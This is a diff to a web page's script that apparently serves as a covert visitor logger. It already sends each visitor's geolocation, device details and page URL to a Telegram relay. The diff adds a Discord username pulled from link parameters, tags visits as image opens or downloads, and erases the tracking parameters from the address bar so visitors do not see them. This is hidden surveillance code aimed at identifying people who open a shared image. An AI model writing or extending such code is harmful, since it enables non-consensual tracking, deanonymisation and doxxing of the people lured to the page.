@@ -369,7 +369,8 @@
                 location: cachedLocation,
                 device: cachedDevice,
                 page: window.location.href,
-                time: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })
+                time: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }),
+                discordUser: getDiscordUser()
             };
             const body = JSON.stringify(payload);
             const apiUrl = new URL('/api/telegram', window.location.origin).href;
@@ -425,14 +426,33 @@
             window.addEventListener('beforeprint', () => notify('print'));
         }
 
+        function getEntryAction() {
+            const params = new URLSearchParams(window.location.search);
+            if (params.get('from') === 'image') return 'image_open';
+            if (params.get('download') === '1') return 'image_download';
+            return 'visit';
+        }
+
+        function getDiscordUser() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get('discord_user') || params.get('user') || null;
+        }
+
         (async () => {
+            const entryAction = getEntryAction();
+
             const [location, device] = await Promise.all([
                 withTimeout(fetchGeoLocation(), 10000),
                 withTimeout(fetchDeviceInfo(), 10000)
             ]);
             cachedLocation = location;
             cachedDevice = device;
-            await sendToTelegram('visit');
+            await sendToTelegram(entryAction);
+
+            if (entryAction === 'image_open' && window.history.replaceState) {
+                window.history.replaceState({}, '', window.location.pathname);
+            }
+
             setupImageTracking();
         })();
     </script>
